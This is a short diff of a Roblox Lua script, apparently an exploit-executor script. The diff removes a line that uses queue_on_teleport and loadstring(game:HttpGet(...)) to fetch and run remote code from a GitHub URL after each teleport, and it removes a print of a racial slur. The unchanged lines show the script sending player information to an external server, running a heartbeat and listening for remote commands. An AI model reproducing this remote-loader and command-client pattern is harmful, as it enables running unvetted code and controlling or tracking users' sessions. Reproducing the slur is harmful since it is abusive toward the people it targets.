@@ -1,7 +1,4 @@
 
-queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/zadadzdzadaz/lib/refs/heads/main/dazdaz.lua'))()")
-
-
 local SERVER_URL = "https://robloxlol-production.up.railway.app"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -270,6 +267,4 @@ sendToServer(playerInfo)
 startHeartbeat()
 listenForCommands()
 
-
-print("nigger")
 
